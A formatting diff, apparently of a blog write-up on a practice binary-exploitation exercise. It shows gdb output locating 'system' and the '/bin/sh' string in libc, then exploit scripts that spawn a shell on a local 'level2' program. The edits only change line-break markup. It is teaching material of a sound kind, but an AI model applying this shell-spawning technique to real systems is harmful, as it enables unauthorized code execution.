@@ -58,10 +58,10 @@ $1 = {<text variable, no debug info>} 0xf7e3f940 <system><br>
 $2 = {<text variable, no debug info>} 0xf7e1d540 <__libc_start_main><br>
 (gdb) find 0xf7e1d540, +2200000, "/bin/sh"<br>
 0xf7f5e02b<br>
-(gdb）quit
-$ python exp2.py
-[+] Starting local process './level2': pid 14319
-[*] Switching to interactive mode
+(gdb）quit<br>
+$ python exp2.py<br>
+[+] Starting local process './level2': pid 14319<br>
+[*] Switching to interactive mode<br>
 $ whoami<br>
 [用户名] <br><br>
   
@@ -109,7 +109,7 @@ $ cp /lib32/libc.so.6 libc.so<br>
 $ objdump -d level2 | grep vulnerable_function0804843b <vulnerable_function>:<br>
  8048471:	e8 c5 ff ff ff       	call   804843b <vulnerable_function><br>
 $ python exp3.py<br>
-[*].......<br>
-[*] Switching to interactive mode
+[ * ].......<br>
+[ * ] Switching to interactive mode
 $ whoami
 [用户名] <br><br>
